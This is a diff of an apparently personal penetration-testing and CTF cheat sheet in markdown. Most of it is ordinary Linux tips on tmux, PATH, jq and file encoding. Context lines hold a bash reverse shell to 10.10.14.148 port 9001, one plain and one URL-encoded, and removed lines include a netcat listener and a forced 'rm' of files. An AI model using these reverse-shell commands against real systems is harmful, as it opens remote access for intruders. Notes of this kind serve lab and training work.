@@ -77,29 +77,6 @@ bash -i >& /dev/tct/10.10.14.148/9001 0>&1
 bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
 ```
 
-nc listener: `nc -lvnp <port>`
-
-### TMUX
-
-tmux can keep alive sessions if you lose ssh sessions etc, can split panes and more:
-
-```text
-tmux new -s <session_name> 
-ctrl-b = prefix key (enables addnl commands) 
-+[%] vertical pane  
-+["] horizontal pane 
-+[alt-space] switch pane between horizontal or vertical
-+[arrow_keys] move between panes 
-+[z] zoom in/out on pane 
-+[?] help for tmux 
-+[t] timer
-```
-
-tmux plugins:
-
-* tmux logging plugin \(get this!!\) can save log of tmux windows
-* [better mouse mode](https://github.com/NHDaly/tmux-better-mouse-mode)
-
 ### Privilege Escalation
 
 [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)
@@ -179,33 +156,7 @@ echo -n <base64material> | base64 -d > filename.file
 
 pretty print JSON text in console \([https://www.howtogeek.com/529219/how-to-parse-json-files-on-the-linux-command-line-with-jq/](https://www.howtogeek.com/529219/how-to-parse-json-files-on-the-linux-command-line-with-jq/)\). Pipe the JSON output to `jq`. Example from NASA ISS API: `curl -s http://api.open-notify.org/iss-now.json | jq`
 
-web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)
-
-convert rpm to debian packages: `alien <file.rpm>`
-
-`sudo rm --force $(which <file_name>)` Remove all instances of a certain file. Could be used with `find` instead of `which`. dangerous with --force!!
-
-cycle through previous arguments: `alt-.`
-
-move between "words" on a command line `ctrl-[arrow_keys]`
-
-### PATH
-
-Add new $PATHs to `.profile` rather than `.bashrc`, then `source ~/.profile` to use new PATHs
-
-Makes `pwd` part of path so dont need `./`  _NOT RECOMMENDED for home use!_  `export PATH='pwd':$PATH`
-
-The bullet-proof way to add a path \(e.g., ~/opt/bin\) to the PATH environment variable is: \(from [https://unix.stackexchange.com/questions/26047/how-to-correctly-add-a-path-to-path](https://unix.stackexchange.com/questions/26047/how-to-correctly-add-a-path-to-path)\)
-
-```text
-PATH="${PATH:+${PATH}:}~/opt/bin"
-for appending (instead of PATH="$PATH:~/opt/bin") and
-
-PATH="~/opt/bin${PATH:+:${PATH}}"
-for prepending (instead of PATH="~/opt/bin:$PATH")
-```
-
 ### Check encoding of a text file
 
-`vi -c 'let $enc = &fileencoding | execute "!echo Encoding: $enc" | q' <file_to_check>` check encoding of a text file \(needed especially when doing crypto with python, or cracking passwords with rockyou.txt\) [https://vim.fandom.com/wiki/Bash\_file\_encoding\_alias](https://vim.fandom.com/wiki/Bash_file_encoding_alias) \(make an alias for the above command\)
+`vi -c 'let $enc = &fileencoding | execute "!echo Encoding: $enc" | q' <file_to_check>` check encoding of a text file \(needed especially when doing crypto with python, or cracking passwords with `rockyou.txt` - _hint: needs latin encoding!_\) [https://vim.fandom.com/wiki/Bash\_file\_encoding\_alias](https://vim.fandom.com/wiki/Bash_file_encoding_alias) \(how to make an alias for the above command\)
 
